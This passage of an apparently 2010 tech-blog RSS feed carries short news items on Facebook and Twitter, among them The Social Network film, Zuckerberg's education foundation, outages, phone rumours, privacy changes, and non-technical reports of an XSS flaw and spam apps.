&lt;p&gt;&lt;a href=&#34;http://lh5.ggpht.com/_40bmzDo_mBs/TKX-QNBzIaI/AAAAAAAABbM/qQoKkSRyPV8/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh3.ggpht.com/_40bmzDo_mBs/TKX-RCiRc9I/AAAAAAAABbQ/0YOU1DpvgJQ/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Jesse Eisenberg plays the role of Mark Zuckerberg, the talented CEO of Facebook. The movie was adapted from Ben Mezrich’s 2009 book The Accidental Billionaires: The Founding of Facebook: A Tale of Sex, Money, Genius and Betrayal, the film focuses on the early years of Facebook, founded in 2004.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook CEO Zuckerberg Launches $100M Startup</title>
      <link>https://example.org/posts/2010-09-25-facebook-ceo-zuckerberg-launches-100m-startup/</link>
      <pubDate>Sat, 25 Sep 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-09-25-facebook-ceo-zuckerberg-launches-100m-startup/</guid>
      <description>&lt;p&gt;Facebook founder and CEO Mark Zuckerberg published a &lt;a href=&#34;http://www.facebook.com/notes/startup-education/blog-post-from-mark-zuckerberg/116078918450633&#34;&gt;blog post&lt;/a&gt; confirming his commitment to Newark’s public school system with $100 million foundation called &lt;strong&gt;Startup: Education&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Saying that, “Education has always been important to me and my family,” Zuckerberg then goes into length about his views on education and the, “many different challenges all facing education at once.”&lt;/p&gt;
&lt;p&gt;Mark Zuckerberg sat down with Oprah to discuss his new Startup:Education foundation that he officially announced in the blog post.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook Down, Huge Outage</title>
      <link>https://example.org/posts/2010-09-23-facebook-down-huge-outage/</link>
      <pubDate>Thu, 23 Sep 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-09-23-facebook-down-huge-outage/</guid>
      <description>&lt;p&gt;Facebook servers presently are not able to handle the load of their 500+ million users and have been out for a while now.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TJuxvEEaxhI/AAAAAAAABZY/9Ih9jesihgk/s1600-h/image%5B8%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh5.ggpht.com/_40bmzDo_mBs/TJuxwHiRdHI/AAAAAAAABZc/Tl7z7O0X8EI/image_thumb%5B4%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Facebook’s &lt;a href=&#34;http://developers.facebook.com/live_status&#34;&gt;Status&lt;/a&gt; page gives few more details -&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Latency issues resolved&lt;/strong&gt;&lt;br&gt;
Sep 22, 2010 5:08pm&lt;/p&gt;
&lt;p&gt;The API latency issues we were experiencing this morning have been resolved. Sorry for the inconvenience.&lt;/p&gt;
&lt;p&gt;**API latency issues&lt;br&gt;
**Sep 22, 2010 1:40pm&lt;/p&gt;
&lt;p&gt;We are currently experiencing decreased latency across the site (including Platform APIs) due to an issue with a third-party networking provider. We are in contact with this provider and working to resolve the issue as soon as possible&lt;/p&gt;</description>
    </item>
    <item>
      <title>Twitter ‘onmouseover’ security flaw widely exploited</title>
      <link>https://example.org/posts/2010-09-21-twitter-onmouseover-security-flaw-widely-exploited/</link>
      <pubDate>Tue, 21 Sep 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-09-21-twitter-onmouseover-security-flaw-widely-exploited/</guid>
      <description>&lt;p&gt;Twitter which recently gave complete new design to its users (&lt;em&gt;still in rolling phase&lt;/em&gt;), got hit by latest XSS bug.&lt;/p&gt;
&lt;p&gt;Upon mouse hovering a link in a tweet - it doesn&amp;rsquo;t even ask you to click - you might redirect to any website (&lt;em&gt;spammers are currently using this to redirect to pornographic and gaming websites&lt;/em&gt;)!&lt;/p&gt;
&lt;p&gt;Thousands of Twitter accounts have posted messages exploiting the flaw. Victims include Sarah Brown, wife of the former British Prime Minister.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Hate CAPTCHAs? Here comes ‘Solve Media’</title>
      <link>https://example.org/posts/2010-09-20-hate-captchas-here-comes-solve-media/</link>
      <pubDate>Mon, 20 Sep 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-09-20-hate-captchas-here-comes-solve-media/</guid>
      <description>&lt;p&gt;Hate dealing with crummy &lt;a href=&#34;http://en.wikipedia.org/wiki/CAPTCHA&#34;&gt;captchas&lt;/a&gt; - the squiggly, indecipherable text strings web sites often force you to read and regurgitate for security reasons? Here comes a new innovative &lt;a href=&#34;http://www.solvemedia.com&#34;&gt;Solve Media&lt;/a&gt; way of doing this.&lt;/p&gt;
&lt;p&gt;The New York start-up isn’t getting rid of captchas, but it does promise to make them more tolerable: It says it can swap out the random, hard-to-read text with clear, concise English. And while it’s at it, it says it can turn captchas into revenue generators for publishers, by transforming them into ad units.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook is building a Phone?</title>
      <link>https://example.org/posts/2010-09-19-facebook-is-building-a-phone/</link>
      <pubDate>Sun, 19 Sep 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-09-19-facebook-is-building-a-phone/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://www.flickr.com/photos/56464613@N00/750214294&#34;&gt;&lt;img alt=&#34;Joe Hewitt&#34; loading=&#34;lazy&#34; src=&#34;https://example.org/posts/2010-09-19-facebook-is-building-a-phone/images/750214294_e2fa2d1537_m.jpg&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;According to &lt;a href=&#34;http://techcrunch.com/2010/09/19/facebook-is-secretly-building-a-phone/&#34;&gt;TechCrunch&lt;/a&gt;’s sources, Facebook is creating its own cellphone. According to the post, they are building the OS and have tied up with a hardware manufacture to build everything else.&lt;/p&gt;
&lt;p&gt;Specifically, Facebook wants to integrate deeply into the contacts list and other core functions of the phone. It can only do that if it controls the operating system.&lt;/p&gt;
&lt;p&gt;The blog post describes that two Facebook employees, Joe Hewitt and Matthew Papakipos are leading the charge on the OS, using their previous careers as Firefox browser creator and Chrome OS builder (respectively) to launch something Facebook can be proud of.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook: “We Are Not Building A Phone”</title>
      <link>https://example.org/posts/2010-09-19-facebook-we-are-not-building-a-phone/</link>
      <pubDate>Sun, 19 Sep 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-09-19-facebook-we-are-not-building-a-phone/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://www.flickr.com/photos/22221172@N00/5004505943&#34;&gt;&lt;img alt=&#34;Facebook phone UI&#34; loading=&#34;lazy&#34; src=&#34;https://example.org/posts/2010-09-19-facebook-we-are-not-building-a-phone/images/5004505943_66e4012a23_m.jpg&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Facebook has responded to the rumors on Facebook &lt;a href=&#34;http://www.cosmogeek.info/2010/09/facebook-is-building-phone.html&#34;&gt;Phone&lt;/a&gt; with a classic non-denial denial. Facebook representative Jaime Schopflin in a statement to &lt;a href=&#34;http://mashable.com/2010/09/19/facebook-we-are-not-building-a-phone/&#34;&gt;Mashable&lt;/a&gt; said “The story, which originated in Techcrunch, is not accurate. Facebook is not building a phone.”&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s Schopflin&amp;rsquo;s entire statement, via Mashable:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;“The story, which originated in Techcrunch, is not accurate. Facebook is not building a phone. Our approach has always been to make phones and apps more social. Current projects include include everything from an HTML5 version of the site to apps on major platforms to full Connect support with SDKs to deeper integrations with some manufacturers.  Our view is that almost all experiences would be better if they were social, so integrating deeply into existing platforms and operating systems is a good way to enable this. For an example, check out Connect for iPhone and the integration we have with contact syncing through our iPhone app.  Another example is the INQ1 phone with Facebook integration (the first so-called ‘Facebook Phone’). The people mentioned in the story are working on these projects. The bottom line is that whenever we work on a deep integration, people want to call it a “Facebook Phone” because that’s such an attractive soundbite, but building phones is just not what we do.”&lt;/p&gt;</description>
    </item>
    <item>
      <title>After Google Instant, its YouTube Instant and Twitter Instant now</title>
      <link>https://example.org/posts/2010-09-13-after-google-instant-its-youtube-instant-and-twitter-instant-now/</link>
      <pubDate>Mon, 13 Sep 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-09-13-after-google-instant-its-youtube-instant-and-twitter-instant-now/</guid>
      <description>&lt;p&gt;Close on heels of &lt;a href=&#34;http://www.google.com/instant/&#34;&gt;Google Instant&lt;/a&gt;, here comes &lt;a href=&#34;http://ytinstant.com/&#34;&gt;YouTube Instant&lt;/a&gt; and &lt;a href=&#34;http://content.manmohanjit.com/uploads/demos/twitter-instant/&#34;&gt;Twitter Instant&lt;/a&gt;, possibly the fastest way to instantly search videos and Twitter right now.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Youtube Instant&lt;/strong&gt; is the creation of &lt;a href=&#34;http://www.feross.org/youtube-instant-media-frenzy/&#34;&gt;Feross Aboukhadijeh&lt;/a&gt;, a computer science student at Stanford University, who bet with his roommate (after the launch of Google Instant) and built a real-time YouTube search in 3 hours!&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh5.ggpht.com/_40bmzDo_mBs/TI3Qo1RkLYI/AAAAAAAABXg/TdE97GDehdM/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;images/image%5B7%5D.png&#34; title=&#34;image&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TI3QrpSsQXI/AAAAAAAABXs/ALSrYzbuAtI/image_thumb%5B3%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook India Office Officially Open</title>
      <link>https://example.org/posts/2010-08-29-facebook-india-office-officially-open/</link>
      <pubDate>Sun, 29 Aug 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-08-29-facebook-india-office-officially-open/</guid>
      <description>&lt;p&gt;Hot on the heels of Facebook overtaking Orkut as India’s most prominent social network with 21 million vs. 20 million unique visitors in July, the company officially opened its much anticipated office in Hyderabad earlier this week. Facebook Hyderabad is Facebook’s second International office, after Dublin, Ireland and the Indian team will include more sales and operations as well as multi-lingual support staff in order provide round-the-clock international support.&lt;/p&gt;
&lt;p&gt;The office was opened in the traditional Indian way, and here is a video of the office opening. Highlights include American Facebookers awkwardly dancing Bollywood-style and an impressive Facebook cake!&lt;/p&gt;</description>
    </item>
    <item>
      <title>Who. What. When. And now Where.</title>
      <link>https://example.org/posts/2010-08-21-who-what-when-and-now-where/</link>
      <pubDate>Sat, 21 Aug 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-08-21-who-what-when-and-now-where/</guid>
      <description>&lt;p&gt;Facebook Places is new Facebook feature that allows you to see where your friends are and share your location in the real world. You can now see if your friends are currently checked in nearby and connect with them easily.&lt;/p&gt;
&lt;p&gt;You can check into nearby Places to tell your friends where you are, tag your friends in the Places you visit, and view comments your friends have made about the Places you visit.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook is a Stupid Idiot (Video)!!</title>
      <link>https://example.org/posts/2010-07-28-facebook-is-a-stupid-idiot-video/</link>
      <pubDate>Wed, 28 Jul 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-07-28-facebook-is-a-stupid-idiot-video/</guid>
      <description>&lt;p&gt;Can’t wait to share this video – &lt;strong&gt;&lt;em&gt;“Facebook is a Stupid Idiot”&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.youtube.com/watch?v=zDHb4wewAIQ&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://lh5.ggpht.com/_40bmzDo_mBs/TFBJjUZPZTI/AAAAAAAABSQ/ZIMLpPrLxOk/video430f0050dfb0%5B10%5D.jpg?imgmax=800&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Farmville fans! Ha..ha..&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook Hits 500 Million Members Milestone !</title>
      <link>https://example.org/posts/2010-07-21-facebook-hits-500-million-members-milestone/</link>
      <pubDate>Wed, 21 Jul 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-07-21-facebook-hits-500-million-members-milestone/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://www.flickr.com/photos/59771526@N00/2929411771&#34;&gt;&lt;img alt=&#34;Mr Mark Zuckerberg AKA Mr Facebook&#34; loading=&#34;lazy&#34; src=&#34;images/2929411771_690e0352b8_m.jpg&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Image by &lt;a href=&#34;http://www.flickr.com/photos/59771526@N00/2929411771&#34;&gt;Carlo Nicora&lt;/a&gt; via Flickr&lt;/p&gt;
&lt;p&gt;The founder and CEO of Facebook Mark Zuckerberg has made it official !! As of today morning, the largest social networking site is now 500 million members strong and growing!!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;“As of this morning, 500 million people all around the world are actively using Facebook to stay connected with their friends and the people around them.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This is an important milestone for all of you who have helped spread Facebook around the world. Now a lot more people have the opportunity to stay connected with the people they care about.”&lt;/em&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>How to hide status updates from certain people in Facebook</title>
      <link>https://example.org/posts/2010-07-10-how-to-hide-status-updates-from-certain-people-in-facebook/</link>
      <pubDate>Sat, 10 Jul 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-07-10-how-to-hide-status-updates-from-certain-people-in-facebook/</guid>
      <description>&lt;p&gt;The other night, when I started roaming in and around outskirts of the City of Pearls, I updated my status on Facebook - ‘&lt;em&gt;At Shabad, Charminar&amp;hellip;2.15 am&amp;hellip;having dinner in &amp;lsquo;Chowki&amp;rsquo; style! Jagne ki raat’&lt;/em&gt; via text message.&lt;/p&gt;
&lt;p&gt;When we reached home in the early morning at around 4.30 am - one of my friends who came along with us started worrying about my status message – &lt;em&gt;his brother might see my FB message and acquaint his parents the real story!&lt;/em&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>What are Hash Tags (#) in Twitter?</title>
      <link>https://example.org/posts/2010-06-28-what-are-hash-tags-in-twitter/</link>
      <pubDate>Mon, 28 Jun 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-06-28-what-are-hash-tags-in-twitter/</guid>
      <description>&lt;p&gt;What is this – &lt;strong&gt;“#”&lt;/strong&gt; sign doing in a lot of Twitter tweets? Why do most of the webmaster and bloggers use this hash symbol in their tweets?&lt;/p&gt;
&lt;p&gt;In simple little words – it’s just categorizing or grouping your tweets like you categorize/group your blog posts in categories.&lt;/p&gt;
&lt;p&gt;Here is how Twitter defines it -&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;&amp;ldquo;Because Twitter provided no easy way to group tweets or add extra data, the Twitter community came up with their own way: hashtags. A hashtag is similar to other web tags it helps add tweets to a category. Hashtags have the ‘hash’ or ‘pound’ symbol (#) preceding the tag, like so: #traffic, #followfriday, #hashtag.”&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook 3.1.3 for iPhone Goes Live – Play Facebook Videos now!</title>
      <link>https://example.org/posts/2010-06-19-facebook-3-1-3-for-iphone-goes-live-play-facebook-videos-now/</link>
      <pubDate>Sat, 19 Jun 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-06-19-facebook-3-1-3-for-iphone-goes-live-play-facebook-videos-now/</guid>
      <description>&lt;p&gt;Facebook version 3.1.3 app for iPhone and iPod touch is out and it brings the long awaited feature of playing facebook videos, along with ability to view and write on the event walls, photo uploads of up to 720px wide, and tons of bug fixes.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;New features in this version:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;- You can now watch Facebook videos.&lt;br&gt;
- You can now view and write on walls of events.&lt;br&gt;
- Uploaded photos are now 720px wide.&lt;/p&gt;</description>
    </item>
    <item>
      <title>New Facebook Privacy Controls Start Rolling Out Tomorrow</title>
      <link>https://example.org/posts/2010-05-25-new-facebook-privacy-controls-start-rolling-out-tomorrow/</link>
      <pubDate>Tue, 25 May 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-05-25-new-facebook-privacy-controls-start-rolling-out-tomorrow/</guid>
      <description>&lt;p&gt;On stage today at TechCrunch Disrupt in New York City, Facebook’s vice president of product Chris Cox announced that starting tomorrow, Facebook will be rolling out “drastically simplified” and improved privacy controls. He didn’t give any details, but did suggest that they should alleviate some of the recent privacy problems Facebook has faced.&lt;/p&gt;
&lt;p&gt;Ever since the recent wave of privacy backlash began following Facebook’s f8 conference, Facebook has been saying they were listening to feedback and would respond. No less than CEO Mark Zuckerberg has been talking about the issues very publicly. He has said they “missed the mark” and “made a bunch of mistakes.” He also has said they are working on a “simpler way to control your information.”&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook announces free mobile service</title>
      <link>https://example.org/posts/2010-05-19-facebook-announces-free-mobile-service/</link>
      <pubDate>Wed, 19 May 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-05-19-facebook-announces-free-mobile-service/</guid>
      <description>&lt;p&gt;Facebook has announced the launch of a new free-to-use mobile service. If you navigate on over to &lt;a href=&#34;http://0.facebook.com&#34;&gt;http://0.facebook.com&lt;/a&gt; on your mobile device you will find a lite version of the current mobile site. This site is free to use if you are lucky enough to be on one of the following combinations of country and operator:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/S_Qs7OvPhRI/AAAAAAAABNo/bipUYoGZ8Ck/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/S_Qs9XFUnMI/AAAAAAAABNw/cvnV7qMsWwI/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;If your on the above list. Browsing to the new facebook page will be totally free of charge - no data charges from your network operator.&lt;/p&gt;</description>
    </item>
    <item>
      <title>How Does Facebook Make Money?</title>
      <link>https://example.org/posts/2010-05-19-how-does-facebook-make-money/</link>
      <pubDate>Wed, 19 May 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-05-19-how-does-facebook-make-money/</guid>
      <description>&lt;p&gt;Facebook revenues reached $500 million in 2009, up from $300 million in 2008, according to Fortune editor David Kirkpatrick, who cites &amp;ldquo;well-informed sources&amp;rdquo; in his upcoming book, The Facebook Effect.&lt;/p&gt;
&lt;p&gt;Facebook expects revenues to reach $800 million in 2010.&lt;/p&gt;
&lt;p&gt;Where did 2009&amp;rsquo;s $500 million come from?&lt;/p&gt;
&lt;p&gt;Self-service ads, which appear on the right side of the screen on Facebook, accounted for about $250 million to $300 million. They look like this:&lt;/p&gt;</description>
    </item>
    <item>
      <title>The 11 Companies That Tried To Buy Facebook</title>
      <link>https://example.org/posts/2010-05-14-the-11-companies-that-tried-to-buy-facebook/</link>
      <pubDate>Fri, 14 May 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-05-14-the-11-companies-that-tried-to-buy-facebook/</guid>
      <description>&lt;p&gt;Facebook isn&amp;rsquo;t just popular with its 500 million or so users.&lt;/p&gt;
&lt;p&gt;According to the copy of &lt;strong&gt;&lt;a href=&#34;http://www.amazon.com/Facebook-Effect-Inside-Company-Connecting/dp/1439102112/ref=sr_1_1?ie=UTF8&amp;amp;s=books&amp;amp;qid=1260660620&amp;amp;sr=1-1&#34;&gt;The Facebook Effect&lt;/a&gt;,&lt;/strong&gt; Fortune editor David Kirkpatrick&amp;rsquo;s brilliantly-reported new book about the company&amp;rsquo;s founding, Facebook has also always been very popular with the M&amp;amp;A suits.&lt;/p&gt;
&lt;p&gt;Below is the list of all the companies that swung and missed&amp;ndash;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;1. In June 2004, an unnamed financier offered $10 million&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;2. Friendster also tried to buy Facebook&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>More Web Industry Leaders Quit Facebook, Call For Open Alternative</title>
      <link>https://example.org/posts/2010-05-12-more-web-industry-leaders-quit-facebook-call-for-open-alternative/</link>
      <pubDate>Wed, 12 May 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-05-12-more-web-industry-leaders-quit-facebook-call-for-open-alternative/</guid>
      <description>&lt;p&gt;A number of high-profile web industry leaders have quit Facebook this week, a turn of events that&amp;rsquo;s sure to heat up conversation about the social network&amp;rsquo;s perceived transgressions. Tonight leading video podcaster &lt;a href=&#34;http://leolaporte.com&#34;&gt;Leo Laporte&lt;/a&gt; announced that he&amp;rsquo;s closed his Facebook account and made a financial donation &lt;a href=&#34;http://www.readwriteweb.com/archives/diaspora_project_building_the_anti-facebook.php&#34;&gt;in support of Diaspora&lt;/a&gt;, a project working to create an alternative social network outside of Facebook&amp;rsquo;s control.&lt;/p&gt;
&lt;p&gt;Laporte said he was convinced to make the move by &lt;a href=&#34;http://calacanis.com/2010/05/12/the-big-game-zuckerberg-and-overplaying-your-hand/&#34;&gt;a post written by entrepreneur Jason Calacanis&lt;/a&gt;, in which Calacanis called Facebook a &amp;ldquo;monster&amp;rdquo; and called for users to throw their support behind OpenID and advocates of distributed social networking as open as the internet. Calacanis to date has not canceled his own Facebook account.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Twitter: Serious Flaw</title>
      <link>https://example.org/posts/2010-05-10-twitter-serious-flaw/</link>
      <pubDate>Mon, 10 May 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-05-10-twitter-serious-flaw/</guid>
      <description>&lt;p&gt;Twitter, the popular short message service has a serious flaw that can impact your feeds and timelines. If you tweet accept &lt;strong&gt;@k_avinash&lt;/strong&gt;, you will automatically be added to that persons follow list.&lt;br&gt;
What exactly does this mean?  It means that anyone can force themselves into your “follow” list without your approval.  No longer do you have control over whom you will follow or who is posting information to your feeds. This works with both native and third party clients.&lt;br&gt;
If a spammer were to exploit this flaw, the results could be devastating to the Twitter service.  A simple script could easily force a spammer&amp;rsquo;s message into thousands of feeds.  A tactic such as this could render the service useless if it becomes overwhelmed with spam. Malicious users could also use it to DM spam users with links and tweets.&lt;br&gt;
Twitter has confirmed they are working on a fix for the issue. All users are currently displaying &amp;ldquo;0 followers&amp;rdquo; at present.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook Security Flaw: See your Friends’ chats</title>
      <link>https://example.org/posts/2010-05-05-facebook-security-flaw-see-your-friends-chats/</link>
      <pubDate>Wed, 05 May 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-05-05-facebook-security-flaw-see-your-friends-chats/</guid>
      <description>&lt;p&gt;A famous blog has pointed out a shocking security flaw in Facebook that allows users to see the live chats.&lt;/p&gt;
&lt;p&gt;There is an option in privacy settings, under personal information and posts, that allows you to preview your profile as it would look to one of your Facebook friends. You are then able to select one of you friends and view it, literally, from their eyes.&lt;/p&gt;
&lt;p&gt;The feature works so well, that if your friend happens to be live chatting at the time, you will see their conversations in action.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Optical Illusion [HQ] – Crappy malware floating on Facebook!</title>
      <link>https://example.org/posts/2010-05-02-optical-illusion-hq-crappy-malware-floating-on-facebook/</link>
      <pubDate>Sun, 02 May 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-05-02-optical-illusion-hq-crappy-malware-floating-on-facebook/</guid>
      <description>&lt;p&gt;Ok. A bunch of people that are my friends are getting this video posted on their walls, and it looks like porn or something. A lot of my friends have gotten it. Even I allowed it incidentally and it posted on many of my fr’s walls automatically. Its this lower half of a naked girl (nothing shown!)&lt;/p&gt;
&lt;p&gt;The application seems to be called “Optical Illusion [HQ]’ and if you click on one of the links it will send out the link to people on your friends list stating person’s name, this is without doubt the hottest video ever! :P :P :P and a link.&lt;/p&gt;</description>
    </item>
    <item>
      <title>MS Silverlight Beta Client for Facebook</title>
      <link>https://example.org/posts/2010-04-13-ms-silverlight-beta-client-for-facebook/</link>
      <pubDate>Tue, 13 Apr 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-04-13-ms-silverlight-beta-client-for-facebook/</guid>
      <description>&lt;p&gt;This Silverlight client app for Facebook is awesome!&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh3.ggpht.com/_40bmzDo_mBs/S8R5E8NPnBI/AAAAAAAABGE/Rczf6zRMxsI/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/S8R5F0Oc0qI/AAAAAAAABGI/Rb3gsCV0dwU/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;You can download it from the following location:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.silverlight.net/content/samples/apps/facebookclient/sfcquickinstall.aspx&#34; title=&#34;http://www.silverlight.net/content/samples/apps/facebookclient/sfcquickinstall.aspx&#34;&gt;http://www.silverlight.net/content/samples/apps/facebookclient/sfcquickinstall.aspx&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>How to Remove Farmville like App Notifications on Facebook Wall</title>
      <link>https://example.org/posts/2010-04-04-how-to-remove-farmville-like-app-notifications-on-facebook-wall/</link>
      <pubDate>Sun, 04 Apr 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-04-04-how-to-remove-farmville-like-app-notifications-on-facebook-wall/</guid>
      <description>&lt;p&gt;Many people want to stop, delete and remove Farmville, Zoo world, Mafia wars like App Notifications, emails, updates, posts on their Facebook wall and news feed. I have so many friends playing these kind of Apps that my FB news feed is full of unwanted crappy updates!&lt;br&gt;
Your friends are addicted Zoo world, Farmville fans and will not stop playing just because you don’t want their FB updates from messaging your wall.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Twitter Launching @anywhere Service</title>
      <link>https://example.org/posts/2010-03-16-twitter-launching-anywhere-service/</link>
      <pubDate>Tue, 16 Mar 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-03-16-twitter-launching-anywhere-service/</guid>
      <description>&lt;p&gt;A new feature in Twitter, @anywhere, which will allow Twitter users to connect to their Twitter accounts using third party websites. This service allows users to easily share news while reading them online from different websites like The New York Times, eBay etc.&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
